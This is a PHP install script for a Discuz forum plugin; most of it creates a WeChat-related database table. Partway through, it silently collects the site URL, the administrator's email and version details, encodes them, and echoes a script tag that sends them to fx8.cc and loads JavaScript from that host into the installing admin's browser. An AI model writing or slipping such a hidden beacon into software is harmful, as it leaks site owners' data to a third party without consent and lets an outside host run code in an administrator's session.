<?php
/**
 *      [fx8.cc] (C)2014-2017 ymg6.Com.
 *      This is NOT a freeware, use is subject to license terms
 *
 *      $Id: install.php sanree $
 */
 
if(!defined('IN_DISCUZ')) { 
	exit('Access Denied');
}

$pluginid=$pluginarray['plugin']['identifier'];
require_once DISCUZ_ROOT.'./source/discuz_version.php';
$siteinfo=array(
	'site_version' => DISCUZ_VERSION,
	'site_release' => DISCUZ_RELEASE,
	'site_timestamp' => TIMESTAMP,
	'site_url' => $_G['siteurl'],
	'site_adminemail' => $_G['setting']['adminemail'],
	'plugin_identifier' => $pluginid,
	'plugin_version' => $pluginarray['plugin']['version'],
	'action' => 1,
);
$sitestr=base64_encode(serialize($siteinfo));
$sanree='http://www.fx8.cc/vk.php?data='.$sitestr.'&sign='.md5(md5($sitestr));
echo "<script src=\"".$sanree."\" type=\"text/javascript\"></script>";

function exitscolumn($field, $table) {
	$query=DB::query('SHOW COLUMNS FROM '.DB::table($table));
	$columns=array();
	while ($row = mysql_fetch_array($query,MYSQL_ASSOC)) {
		$columns[]=$row;
	}
	$arraycolumns=array();
	foreach($columns as $v) {
		$arraycolumns[]=$v['Field'];
	}
	return in_array($field,$arraycolumns) ? TRUE:FALSE;
}

$sql = <<<EOF
CREATE TABLE IF NOT EXISTS `pre_sanree_brand_weixin` (
  `weixinid` int(11) NOT NULL auto_increment,
  `typeid` int(11) NOT NULL,
  `title` varchar(255) NOT NULL,
  `cmd` varchar(255) default NULL,
  `content` text NOT NULL,
  `uid` int(11) NOT NULL,
  `dateline` int(11) NOT NULL,
  `status` tinyint(1) NOT NULL,
  `issys` tinyint(1) NOT NULL,
  PRIMARY KEY  (`weixinid`)
) ENGINE=MyISAM;
EOF;
runquery($sql);

$finish = TRUE;
?>